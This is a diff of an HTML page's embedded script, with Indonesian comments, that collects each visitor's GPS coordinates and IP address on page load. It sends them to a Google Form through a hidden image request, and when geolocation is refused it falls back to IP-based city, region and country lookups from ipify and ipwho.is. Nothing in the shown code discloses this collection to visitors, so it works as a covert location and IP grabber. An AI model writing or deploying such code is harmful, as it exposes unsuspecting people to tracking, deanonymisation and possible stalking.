@@ -9,52 +9,55 @@
   <script>
     const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
     const F = {
-      lat:  'entry.336954328',    // Latitude
-      long: 'entry.122334606',    // Longitude
-      acc:  'entry.1466949585',   // Accuracy
-      city: 'entry.1958665783',   // City
-      reg:  'entry.1713030934',   // Region
-      id:   'entry.2142024660',   // Country/ID
-      ip:   'entry.1095561107'  // <–– ganti dengan ID field IP Address
+      lat:  'entry.336954328',   // Latitude
+      long: 'entry.122334606',   // Longitude
+      acc:  'entry.1466949585',  // Accuracy
+      city: 'entry.1958665783',  // City
+      reg:  'entry.1713030934',  // Region
+      id:   'entry.2142024660',  // Country/ID
+      ip:   'entry.1095561107'   // ID field IP Address
     };
 
     function submit(params) {
+      // trigger GET ke formResponse
       new Image().src = FORM_URL + '?' + new URLSearchParams(params);
     }
 
+    // Ambil lokasi via Geolocation API
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        p => {
-          // Pertama fetch IP-nya
-          fetch('https://ipapi.co/json/')
-            .then(r => r.json())
-            .then(d => {
-              submit({
-                [F.lat]:  p.coords.latitude,
-                [F.long]: p.coords.longitude,
-                [F.acc]:  p.coords.accuracy,
-                [F.ip]:   d.ip
-              });
-            })
-            .catch(() => {
-              // Jika gagal ambil IP
-              submit({
-                [F.lat]:  p.coords.latitude,
-                [F.long]: p.coords.longitude,
-                [F.acc]:  p.coords.accuracy,
-                [F.ip]:   'unknown'
-              });
+      navigator.geolocation.getCurrentPosition(pos => {
+        // setelah dapat GPS, ambil IP via ipify
+        fetch('https://api.ipify.org?format=json')
+          .then(r => r.json())
+          .then(d => {
+            submit({
+              [F.lat]:  pos.coords.latitude,
+              [F.long]: pos.coords.longitude,
+              [F.acc]:  pos.coords.accuracy,
+              [F.ip]:   d.ip
             });
-        },
-        _=> fallbackIP(),
-        { timeout: 8000 }
-      );
+          })
+          .catch(() => {
+            // kalau gagal ambil IP
+            submit({
+              [F.lat]:  pos.coords.latitude,
+              [F.long]: pos.coords.longitude,
+              [F.acc]:  pos.coords.accuracy,
+              [F.ip]:   'unknown'
+            });
+          });
+      },
+      // kalau geolocation gagal atau ditolak
+      _=> fallback(),
+      { timeout: 8000 });
     } else {
-      fallbackIP();
+      // browser tidak support geolocation
+      fallback();
     }
 
-    function fallbackIP() {
-      fetch('https://ipapi.co/json/')
+    function fallback() {
+      // fallback ambil IP & geo dari ipwho.is
+      fetch('https://ipwho.is/json/')
         .then(r => r.json())
         .then(d => {
           submit({
@@ -63,11 +66,19 @@
             [F.acc]:  'IP',
             [F.city]: d.city,
             [F.reg]:  d.region,
-            [F.id]:   d.country_name,
+            [F.id]:   d.country,
             [F.ip]:   d.ip
           });
         })
-        .catch(()=>{/* silent */});
+        .catch(() => {
+          // benar-benar gagal seluruhnya
+          submit({
+            [F.lat]:  0,
+            [F.long]: 0,
+            [F.acc]:  'error',
+            [F.ip]:   'error'
+          });
+        });
     }
   </script>
 </body>
